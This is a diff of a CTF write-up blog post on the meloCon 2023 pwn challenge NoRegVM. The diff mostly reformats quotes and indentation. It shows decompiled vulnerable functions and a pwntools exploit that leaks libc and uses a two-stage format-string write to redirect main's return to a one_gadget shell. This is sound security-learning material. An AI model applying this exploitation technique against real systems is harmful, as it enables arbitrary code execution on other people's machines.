@@ -1,14 +1,12 @@
 ---
-title: "meloCon CTF 2023 Writeup"
-date: "2023-05-16"
+title: 'meloCon CTF 2023 Writeup'
+date: '2023-05-16'
 tags: ['Writeup']
 draft: false
-summary: "At meloCon 2023,  I attempted to solve two pwn challenges. The NoRegVM chall has multiple vulnerabilities but turned out that only the fmt vulnerability is exploitable. I utilized the double-staged fmt exploitation again which I just learned from the last week."
+summary: 'At meloCon 2023,  I attempted to solve two pwn challenges. The NoRegVM chall has multiple vulnerabilities but turned out that only the fmt vulnerability is exploitable. I utilized the double-staged fmt exploitation again which I just learned from the last week.'
 ---
 
-At meloCon 2023,  I attempted to solve two pwn challenges. The NoRegVM chall has multiple vulnerabilities but turned out that only the fmt vulnerability is exploitable. I utilized the double-staged fmt exploitation again which I just learned from the last week.
-
-
+At meloCon 2023, I attempted to solve two pwn challenges. The NoRegVM chall has multiple vulnerabilities but turned out that only the fmt vulnerability is exploitable. I utilized the double-staged fmt exploitation again which I just learned from the last week.
 
 ## Pwn
 
@@ -19,69 +17,69 @@ In the program, we can find several vulnerabilities here:
 
 1. stack overflow in `len` function. Since we could control the memory region, it attempted to copy the contents to the stack buffer. However, this function 1. was safeguarded by a canary 2. doesn't allow copying null bytes.
 
-    ```
-    __int64 __fastcall len(int *a1)
-    {
-      int *v1; // rax
-      int v2; // ecx
-      int v4; // [rsp+14h] [rbp-DCh]
-      int *v5; // [rsp+18h] [rbp-D8h]
-      char s[200]; // [rsp+20h] [rbp-D0h] BYREF
-      unsigned __int64 v7; // [rsp+E8h] [rbp-8h]
-    
-      v7 = __readfsqword(0x28u);
-      v4 = 0;
-      v5 = (int *)((char *)memory + 4 * *a1);
-      while ( *v5 )
+   ```
+   __int64 __fastcall len(int *a1)
+   {
+     int *v1; // rax
+     int v2; // ecx
+     int v4; // [rsp+14h] [rbp-DCh]
+     int *v5; // [rsp+18h] [rbp-D8h]
+     char s[200]; // [rsp+20h] [rbp-D0h] BYREF
+     unsigned __int64 v7; // [rsp+E8h] [rbp-8h]
+
+     v7 = __readfsqword(0x28u);
+     v4 = 0;
+     v5 = (int *)((char *)memory + 4 * *a1);
+     while ( *v5 )
+     {
+       v1 = v5++;
+       v2 = *v1;
+       LODWORD(v1) = v4++;
+       s[(int)v1] = v2;
+     }
+     *((_DWORD *)memory + a1[1]) = strlen(s);
+     return 2LL;
+   }
+   ```
+
+   2. OOR through `pop_out`+`write_buf` on the heap. The program first attempted to copy data from the memory to the global memory named `output` and then print the content of the `output`. We could manipulate the index `a1` and assign it a negative value to make it point to other areas of interest.
+
+      ```
+      __int64 __fastcall pop_out(_DWORD *a1)
       {
-        v1 = v5++;
-        v2 = *v1;
-        LODWORD(v1) = v4++;
-        s[(int)v1] = v2;       
+        int v1; // ecx
+        int v2; // eax
+        int i; // [rsp+14h] [rbp-4h]
+
+        for ( i = 0; i < a1[1]; ++i )
+        {
+          v1 = *((_DWORD *)memory + *a1 + i);
+          v2 = out_pointer++;
+          output[v2] = v1;
+        }
+        return 2LL;
       }
-      *((_DWORD *)memory + a1[1]) = strlen(s);
-      return 2LL;
-    }
-    ```
 
-    2. OOR through `pop_out`+`write_buf` on the heap. The program first attempted to copy data from the memory to the global memory named `output` and then print the content of the `output`. We could manipulate the index `a1` and assign it a negative value to make it point to other areas of interest.
+      __int64 __fastcall write_buf(int *a1, const char **a2)
+      {
+        if ( *a1 <= 199 )
+          printf("%s", *a2);
+        return 1LL;
+      }
+      ```
 
-        ```
-        __int64 __fastcall pop_out(_DWORD *a1)
-        {
-          int v1; // ecx
-          int v2; // eax
-          int i; // [rsp+14h] [rbp-4h]
-        
-          for ( i = 0; i < a1[1]; ++i )
-          {
-            v1 = *((_DWORD *)memory + *a1 + i);
-            v2 = out_pointer++;
-            output[v2] = v1;
-          }
-          return 2LL;
-        }
-        
-        __int64 __fastcall write_buf(int *a1, const char **a2)
-        {
-          if ( *a1 <= 199 )
-            printf("%s", *a2);
-          return 1LL;
-        }
-        ```
+   3. OOW through `pop_in`+`read_buf` on heap, which is quite similar to 2.
 
-    3. OOW through `pop_in`+`read_buf` on heap, which is quite similar to 2.
+   4. fmt vulnerability in `pop_out`. Instead of controlling the array index to determine which heap content was to be copied to the output variable, another OOW existed in the output variable. Notably, a format string was placed in the `.data` segment rather than the `.rodata` segment, suggesting that we could manipulate the format string.
 
-    4. fmt vulnerability in `pop_out`. Instead of controlling the array index to determine which heap content was to be copied to the output variable, another OOW existed in the output variable. Notably, a format string was placed in the `.data` segment rather than the `.rodata` segment, suggesting that we could manipulate the format string.
-
-        ![noreg-1](/static/images/melocon-CTF-2023-Writeup/noreg-1.png)
+      ![noreg-1](/static/images/melocon-CTF-2023-Writeup/noreg-1.png)
 
 Previously, I didn't identify the fourth vulnerability. However, the second and third vulnerabilities are difficult to exploit because our controlled index will always be left-shifted (`shl`) by 2 bytes when used as an offset. However, only one byte (rather than four bytes) will be copied each time. Even though we could use a divide operation to `shr` 12 bytes by dividing 0x100, this is still unstable since sometimes the address will be viewed as a negative integer(the highest bit is `0x1`) and cause the wrong result.
 
 ```
 def leak(index):
     p = add(0,index,2)
-     
+
     for i in range(4):
         p += pop_out(0,1)
         p += div(0,0,3) # the third argument in memory region is 0x100
@@ -103,7 +101,7 @@ Solution:
     (since we could leak the addr, we don't need to bruteforce)
         2.1 leverage current rbp (an existing stack pointer) to make the pointer points to the return address of main
         2.2 leverage our modified stack pointer to overwrite the return address of main
-    
+
     if the one_gadget cannot be satisfied, we can use the stack pivot technique to transfer the stack to the memory chunk or output buffer
 ```
 
@@ -118,18 +116,18 @@ The final exploit would look like this:
 ```
 def add(destIndex,n1Index,n2Index):
     return p32(1) + p32(destIndex) + p32(n1Index) + p32(n2Index)
-                          
+
 def div(destIndex,dividendIndex,divisorIndex):
     return p32(4) + p32(destIndex) + p32(dividendIndex) + p32(divisorIndex)
-                          
+
 def pop_in(startIndex,n):
     return p32(7) + p32(startIndex) + p32(n)
-                          
-def pop_out(startIndex,n): 
+
+def pop_out(startIndex,n):
     return p32(8) + p32(startIndex) + p32(n)
-                                                    
+
 def read_buf(n):
-    return p32(9) + p32(n) 
+    return p32(9) + p32(n)
 
 def write_buf():
     return p32(0xa) + p32(0)
@@ -212,9 +210,9 @@ def exploit():
 
     one_gadget = libcbase + 0xf25ea
     log.info("one gadget address: %s" % hex(one_gadget))
-    
+
     ### First stage
-    ### leverage the current rbp (8th argument) to overwrite the next rbp (16th argument) points to the return address of main +2 
+    ### leverage the current rbp (8th argument) to overwrite the next rbp (16th argument) points to the return address of main +2
     fmt_payload = f"%{(stack_main_ret_addr&0xff)+0x2}c%8$hhn"
     _log_payload(fmt_payload)
     sh.sendline(fmt_payload)
@@ -246,7 +244,7 @@ def exploit():
     sh.sendline(fmt_payload)
 
     sh.interactive()
-    
+
 def save_file():
     global idx, code, memory
     with open("solve-program.vm","wb") as p:
@@ -272,7 +270,7 @@ def m0lecat(fn):
     sh.recvuntil(b"> ")
     sh.sendline(fn)
     sh.sendline()
-    
+
     while True:
         log.info("Receiving...")
         content = sh.recv(1024, timeout=1)
